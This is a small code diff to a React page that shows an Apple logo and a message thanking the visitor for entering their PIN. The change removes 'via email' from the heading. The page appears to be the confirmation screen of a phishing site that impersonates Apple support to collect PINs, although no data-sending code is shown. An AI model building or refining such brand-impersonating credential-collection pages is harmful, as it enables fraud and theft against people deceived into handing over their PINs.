@@ -113,7 +113,7 @@ export default function handlecheck() {
         }}>
           <img src="/appleLogo.png" alt="Apple Logo" style={{ width: 60, height: 60, marginBottom: 24, borderRadius: '50%', background: '#fff', boxShadow: '0 2px 8px rgba(0,0,0,0.06)' }} />
           <h2 style={{ fontWeight: 'bold', fontSize: '2rem', margin: '0 0 1.2rem 0', textAlign: 'center', color: '#222' }}>
-            We will get back to you shortly via email
+            We will get back to you shortly
           </h2>
           <p style={{ fontSize: '1.15rem', color: '#444', textAlign: 'center', maxWidth: '500px', marginBottom: 24 }}>
             Thank you for inputing your pin. Our support team will review your request and contact you at your registered email address soon.<br /><br />
